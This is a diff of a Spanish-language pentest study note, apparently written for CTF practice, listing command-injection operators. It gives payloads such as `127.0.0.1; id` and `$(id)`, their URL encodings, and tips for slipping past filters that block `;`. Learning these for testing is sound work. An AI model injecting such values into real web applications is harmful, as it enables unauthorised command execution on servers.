@@ -1,16 +1,16 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/command-injection
   - technique/execution
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[OS Command Injection]]"
+  - '[[OS Command Injection]]'
 ---
 # Command Injection - Operadores Generales
 
@@ -18,24 +18,35 @@ linked:
 
 ## Cheatsheet
 
-|    **Operador**    |         **Carácter**         |          **URL Encoded**          | **Comportamiento de Ejecución** |                                       **Notas**                                       |
-|:------------------:|:----------------------------:|:---------------------------------:|:-------------------------------:|:-------------------------------------------------------------------------------------:|
-| <br>**Semicolon**  |  <pre><code>;</code></pre>   |    <pre><code>%3b</code></pre>    |      <br>Ejecuta **Ambos**      |                     <br>Secuencial (primero uno, luego el otro).                      |
-|  <br>**New Line**  |  <pre><code>\n</code></pre>  |    <pre><code>%0a</code></pre>    |      <br>Ejecuta **Ambos**      |                              <br>Simula presionar Enter.                              |
-| <br>**Background** |  <pre><code>&</code></pre>   |    <pre><code>%26</code></pre>    |      <br>Ejecuta **Ambos**      |                 <br>Ejecuta el comando en segundo plano (background).                 |
-|    <br>**Pipe**    |  <pre><code>\|</code></pre>  |    <pre><code>%7c</code></pre>    |      <br>Ejecuta **Ambos**      | <br>Pasa la salida del 1º como entrada del 2º (Usualmente solo ves la salida del 2º). |
-|    <br>**AND**     |  <pre><code>&&</code></pre>  |  <pre><code>%26%26</code></pre>   |       <br>**Condicional**       |                   <br>Ejecuta el 2º **solo si** el 1º tiene éxito.                    |
-|     <br>**OR**     | <pre><code>\|\|</code></pre> |  <pre><code>%7c%7c</code></pre>   |       <br>**Condicional**       |                  <br>Ejecuta el 2º **solo si** el 1º falla (error).                   |
-| <br>**Sub-Shell**  |  <pre><code>`</code></pre>   |  <pre><code>>%60%60</code></pre>  |      <br>Ejecuta **Ambos**      |           <br>**Sólo Linux**. Ejecuta el contenido entre comillas primero.            |
-| <br>**Sub-Shell**  | <pre><code>$()</code></pre>  | <pre><code>%24%28%29</code></pre> |      <br>Ejecuta **Ambos**      |                     <br>**Sólo Linux**. Igual que las backticks.                      |
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `127.0.0.1; id` | Ejecuta `id` después del primer comando | Ambos siempre ejecutan. Linux/PowerShell. NO funciona en cmd.exe. |
+| `127.0.0.1%0aid` | Newline como separador secuencial | Filtro bloquea `;` pero deja `\n`. URL-encode `%0a`. |
+| `127.0.0.1 & id` | Backgrounds primero, ejecuta el segundo | Filtros que bloquean `;` pero ignoran `&`. |
+| `127.0.0.1 \| id` | Pipe — output del primero a stdin del segundo, ver solo el segundo | Filtro permite pipes. Salida limpia. |
+| `127.0.0.1 && id` | Ejecuta `id` SOLO si el primero tuvo éxito | Cuando el primer cmd es válido y querés confirmar éxito. |
+| `127.0.0.1 \|\| id` | Ejecuta `id` SOLO si el primero falla | **Trick CTF**: dejar el primer cmd inválido → output limpio sin ruido. |
+| `127.0.0.1`id`` | Sub-shell con backticks — ejecuta `id` y embebe resultado | **Linux only**. Stdout del sub-cmd se inserta en el comando padre. |
+| `127.0.0.1$(id)` | Sub-shell `$()` — equivalente más moderno | **Linux only**. Permite anidar `$(cmd1 $(cmd2))`. |
 ^ci-operadores-generales
 
-> [!WARNING] Excepción en Windows
-> El operador de punto y coma (`;`) **NO funcionará** si el servidor backend está usando **Windows CMD**. 
-> Sin embargo, **SÍ funcionará** si el backend usa **PowerShell**.
+### URL-encoded (cuando se inyectan en query/body)
 
-> [!TIP] Truco para CTFs
-> El operador `||` es excelente para obtener una salida "limpia". Si omites el argumento esperado (ej: no pones la IP) y empiezas directo con `||`, el primer comando fallará y solo verás tu inyección.
+| Operador | Encoded |
+|:---:|:---:|
+| `;` | `%3b` |
+| `\n` | `%0a` |
+| `&` | `%26` |
+| `\|` | `%7c` |
+| `&&` | `%26%26` |
+| `\|\|` | `%7c%7c` |
+| `` ` `` | `%60` |
+| `$()` | `%24%28%29` |
 
+> [!WARNING] Excepción Windows
+> `;` **NO funciona** en CMD. Sí funciona en PowerShell. En CMD usar `&` o `&&`.
+
+> [!TIP] Truco CTFs
+> `||` da salida limpia: dejá el primer comando intencionalmente roto (sin argumento, `127.0.0.1` sin `ping`, etc.) → falla → solo se ve la salida de la inyección.
 
 ---
